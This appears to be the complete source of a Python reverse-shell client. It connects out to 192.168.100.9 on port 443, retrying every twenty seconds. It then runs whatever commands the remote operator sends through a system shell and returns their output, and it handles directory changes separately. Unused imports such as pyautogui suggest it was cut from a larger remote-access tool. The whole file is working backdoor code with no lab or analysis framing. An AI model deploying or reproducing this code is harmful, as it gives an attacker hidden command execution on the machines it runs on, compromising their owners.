#!/usr/bin/python3

import socket
import subprocess
import json
import time
import os
import sys
import shutil
import platform
import pyautogui
import io

def sending(command):
    try:
        json_data = json.dumps(command)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

def receive():
    json_data = ""
    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue
        except Exception:
            print(f"Error receiving data: {s}")
            break

def connection():
    global s
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.100.9", 443))
            shell()
            break  # Exit loop after successful shell session
        except socket.error as e:
            print(f"Connection error: {e}")
            continue  # Retry after sleep interval

def shell():
    while True:
        try:
            command = receive()
            if command is None:
                print("Connection closed by the server.")
                break

            if command.lower() in ["exit", "quit"]:
                print("Command received to end connection.")
                break

            elif command.startswith("cd "):  # Gérer la commande 'cd'
                try:
                    os.chdir(command[3:])
                    # Envoyer le nouveau répertoire au serveur
                    sending(f"Changed directory to {os.getcwd()}")
                except FileNotFoundError:
                    sending("Directory not found.")
                except Exception as e:
                    sending(f"Error changing directory: {str(e)}")
                continue

            elif command.strip() == "cd":  # Si l'utilisateur veut vérifier le répertoire
                sending(os.getcwd())
                continue

            # Exécuter toutes les autres commandes
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            result = proc.stdout.read() + proc.stderr.read()
            sending(result.decode('utf-8', errors='replace'))

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            print(f"General error: {e}")
            sending(f"Error: {str(e)}")

    print("Exiting shell...")





s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection()
finally:
    s.close()
